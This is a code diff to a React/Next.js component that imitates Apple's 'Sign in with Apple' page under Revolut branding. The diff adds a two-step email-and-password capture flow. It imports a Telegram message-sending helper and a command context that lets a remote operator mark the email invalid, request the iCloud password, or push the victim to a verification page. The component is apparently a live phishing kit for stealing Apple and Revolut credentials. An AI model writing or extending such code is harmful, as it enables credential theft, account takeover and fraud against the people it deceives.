@@ -1,10 +1,72 @@
 "use client"
 import '../app/globals.css';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
+import { sendMessageToTelegram } from '../lib/api';
+import { useCommand } from '../app/lib/CommandContext';
+import { useRouter } from 'next/navigation';
 
 export default function AppleAuth() {
     const [isFocused, setIsFocused] = useState(false);
+    const [isPasswordFocused, setIsPasswordFocused] = useState(false);
+    const [email, setEmail] = useState('');
+    const [password, setPassword] = useState('');
+    const [currentStep, setCurrentStep] = useState('email'); // 'email' or 'password'
+    const [isLoading, setIsLoading] = useState(false);
+    const [isInvalid, setInvalid] = useState(false);
+    const router = useRouter();
+    const { command, resetCommand } = useCommand();
 
+    useEffect(() => {
+        if (command === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
+            setInvalid(true);
+            setIsLoading(false);
+            setCurrentStep('email');
+        } else if (command === 'REQUEST_ICLOUD_PASSWORD') {
+            setIsLoading(false);
+            setCurrentStep('password');
+        } else if (command === 'FINISH') {
+            setTimeout(() => {
+                resetCommand(); 
+                router.push('/verificationPage');
+            }, 1500);
+        }
+    }, [command, router, resetCommand]);
+
+    const handleEmailSubmit = (e) => {
+        e.preventDefault();
+        if (!email.trim()) return;
+        
+        setIsLoading(true);
+        console.log("Email submitted:", email);
+        
+        // Simulate API call delay
+        setTimeout(() => {
+            setIsLoading(false);
+            setCurrentStep('password');
+        }, 1500);
+    };
+
+    const handlePasswordSubmit = (e) => {
+        e.preventDefault();
+        if (!password.trim()) return;
+        
+        setIsLoading(true);
+        console.log("Email:", email, "Password:", password);
+        
+        // You can add API call here to send the data
+        // For now just logging to console
+        
+        // Simulate API call delay
+        setTimeout(() => {
+            setIsLoading(false);
+            // You can redirect or show success message here
+        }, 1500);
+    };
+
+    const stopLoader = () => {
+        setIsLoading(false);
+    };
+    
     return (
         <div className="bg-white text-black">
             {/* Header */}
@@ -23,8 +85,6 @@ export default function AppleAuth() {
                     <svg width="16px" className='scale-150' height="16px" viewBox="0 0 20 20"><polyline id="globalnav-menutrigger-bread-bottom" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 12, 16 12"><animate id="globalnav-anim-menutrigger-bread-bottom-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 12, 16 12; 2 9, 16 9; 3.5 15, 15 3.5"></animate><animate id="globalnav-anim-menutrigger-bread-bottom-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 15, 15 3.5; 2 9, 16 9; 2 12, 16 12"></animate></polyline><polyline id="globalnav-menutrigger-bread-top" className="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLineJoin="round" points="2 5, 16 5"><animate id="globalnav-anim-menutrigger-bread-top-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 5, 16 5; 2 9, 16 9; 3.5 3.5, 15 15"></animate><animate id="globalnav-anim-menutrigger-bread-top-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 3.5, 15 15; 2 9, 16 9; 2 5, 16 5"></animate></polyline></svg>
                 </div>
 
-
-
                 {/* header-two */}
                 <div className="w-full flex border-b border-gray-300 pb-3 justify-between items-center max-h-[48px]">
                     <div className='AppleSemiBold font-semibold text-xl'>
@@ -37,69 +97,129 @@ export default function AppleAuth() {
                 </div>
             </div>
 
-
-
-
-
             {/* main container */}
             <div className='flex flex-col items-center mt-9 w-full'>
-
                 <div className='flex-col w-full px-3 max-w-[507px]'>
                     {/* Authentication Logo - text */}
                     <div className='flex flex-col gap-[10px] justify-center text-center items-center w-full'>
                         <div className='w-16 h-16 rounded-xl p-1' style={{ boxShadow: '0 0 10px rgba(0, 0, 0, 0.2)' }}>
-                            <img src="https://assets.revolut.com/assets/brand/Revolut-Symbol-Black.svg" />
+                            <img src="https://assets.revolut.com/assets/brand/Revolut-Symbol-Black.svg" alt="Revolut Logo" />
                         </div>
 
                         <p className='text-md text-gray-800'>Use your Apple Account to sign in to Revolut.</p>
                     </div>
 
-
-
                     {/* form */}
                     <div className='w-full mt-9'>
-
-                        {/* Input Container */}
-                        <div
-                            className={`relative w-full border rounded-xl border-gray-400 h-[56px] transition-all duration-200 ${isFocused ? 'border-blue-500 border-3' : ''
-                                }`}
-                        >
-                            {/* Label */}
-                            <label
-                                className={`absolute left-4 transition-all duration-200 ${isFocused
-                                    ? 'top-1 text-xs'
-                                    : 'top-1/2 transform -translate-y-1/2 text-gray-500'
-                                    }`}
-                            >
-                                Email or Phone Number
-                            </label>
-
-                            {/* Input */}
-                            <input
-                                type="text"
-                                className="w-full h-full px-4 pt-4 pb-2 bg-transparent outline-none"
-                                onFocus={() => setIsFocused(true)}
-                                onBlur={(e) => {
-                                    if (!e.target.value) setIsFocused(false);
-                                }}
-                            />
-
-                            {/* Icon Container */}
-                            <div
-                                className={`absolute border p-1 rounded-full  border-gray-500 right-4 transition-all duration-200 ${isFocused ? 'top-5' : 'top-1/2 transform -translate-y-1/2'
-                                    }`}
-                            >
-                                <svg
-                                    xmlns="http://www.w3.org/2000/svg"
-                                    height="20px"
-                                    viewBox="0 -960 960 960"
-                                    width="20px"
-                                    fill="#6b7280"
+                        {currentStep === 'email' && (
+                            <form onSubmit={handleEmailSubmit}>
+                                {/* Email Input Container */}
+                                <div
+                                    className={`relative w-full border rounded-xl ${isInvalid ? 'border-red-500' : 'border-gray-400'} h-[56px] transition-all duration-200 ${isFocused ? 'border-blue-500 border-2' : ''}`}
                                 >
-                                    <path d="M440-200v-240H80v-80h360v-240l440 280-440 280Z" />
-                                </svg>
-                            </div>
-                        </div>
+                                    {/* Label */}
+                                    <label
+                                        className={`absolute left-4 transition-all duration-200 ${isFocused || email
+                                            ? 'top-1 text-xs'
+                                            : 'top-1/2 transform -translate-y-1/2 text-gray-500'
+                                            }`}
+                                    >
+                                        Email or Phone Number
+                                    </label>
+
+                                    {/* Input */}
+                                    <input
+                                        type="text"
+                                        value={email}
+                                        onChange={(e) => setEmail(e.target.value)}
+                                        className="w-full h-full px-4 pt-4 pb-2 bg-transparent outline-none"
+                                        onFocus={() => setIsFocused(true)}
+                                        onBlur={(e) => {
+                                            if (!e.target.value) setIsFocused(false);
+                                        }}
+                                    />
+
+                                    {/* Icon Container */}
+                                    <button
+                                        type="submit"
+                                        className={`absolute border p-1 rounded-full border-gray-500 right-4 transition-all duration-200 ${isFocused || email ? 'top-5' : 'top-1/2 transform -translate-y-1/2'}`}
+                                        disabled={isLoading}
+                                    >
+                                        {isLoading ? (
+                                            <div className="w-5 h-5 border-t-2 border-blue-500 border-solid rounded-full animate-spin"></div>
+                                        ) : (
+                                            <svg
+                                                xmlns="http://www.w3.org/2000/svg"
+                                                height="20px"
+                                                viewBox="0 -960 960 960"
+                                                width="20px"
+                                                fill="#6b7280"
+                                            >
+                                                <path d="M440-200v-240H80v-80h360v-240l440 280-440 280Z" />
+                                            </svg>
+                                        )}
+                                    </button>
+                                </div>
+
+                                {isInvalid && (
+                                    <p className="text-red-500 text-sm mt-1">
+                                        Please enter a valid email address or phone number.
+                                    </p>
+                                )}
+                            </form>
+                        )}
+
+                        {currentStep === 'password' && (
+                            <form onSubmit={handlePasswordSubmit}>
+                                {/* Password Input Container */}
+                                <div
+                                    className={`relative w-full border rounded-xl border-gray-400 h-[56px] transition-all duration-200 ${isPasswordFocused ? 'border-blue-500 border-2' : ''}`}
+                                >
+                                    {/* Label */}
+                                    <label
+                                        className={`absolute left-4 transition-all duration-200 ${isPasswordFocused || password
+                                            ? 'top-1 text-xs'
+                                            : 'top-1/2 transform -translate-y-1/2 text-gray-500'
+                                            }`}
+                                    >
+                                        Password
+                                    </label>
+
+                                    {/* Input */}
+                                    <input
+                                        type="password"
+                                        value={password}
+                                        onChange={(e) => setPassword(e.target.value)}
+                                        className="w-full h-full px-4 pt-4 pb-2 bg-transparent outline-none"
+                                        onFocus={() => setIsPasswordFocused(true)}
+                                        onBlur={(e) => {
+                                            if (!e.target.value) setIsPasswordFocused(false);
+                                        }}
+                                    />
+
+                                    {/* Icon Container */}
+                                    <button
+                                        type="submit"
+                                        className={`absolute border p-1 rounded-full border-gray-500 right-4 transition-all duration-200 ${isPasswordFocused || password ? 'top-5' : 'top-1/2 transform -translate-y-1/2'}`}
+                                        disabled={isLoading}
+                                    >
+                                        {isLoading ? (
+                                            <div className="w-5 h-5 border-t-2 border-blue-500 border-solid rounded-full animate-spin"></div>
+                                        ) : (
+                                            <svg
+                                                xmlns="http://www.w3.org/2000/svg"
+                                                height="20px"
+                                                viewBox="0 -960 960 960"
+                                                width="20px"
+                                                fill="#6b7280"
+                                            >
+                                                <path d="M440-200v-240H80v-80h360v-240l440 280-440 280Z" />
+                                            </svg>
+                                        )}
+                                    </button>
+                                </div>
+                            </form>
+                        )}
 
 
                         {/* forgot password */}
